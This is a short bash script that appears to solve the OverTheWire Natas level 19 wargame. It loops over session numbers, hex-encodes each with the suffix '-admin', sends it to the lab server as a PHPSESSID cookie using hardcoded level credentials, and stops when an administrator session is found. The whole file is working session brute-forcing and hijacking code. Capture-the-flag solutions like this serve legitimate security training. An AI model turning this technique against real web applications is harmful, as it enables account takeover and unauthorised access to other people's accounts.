#!/bin/bash

for i in {0..640}; do
		var=$(echo -n "$i-admin" | xxd -p)
		response=$(curl -s -u natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT -b "PHPSESSID=$var" "http://natas19.natas.labs.overthewire.org")
		echo $i
		if [[ "$response" != *"regular"* ]]; then
                	echo $i
			echo $response
			break
		fi
done

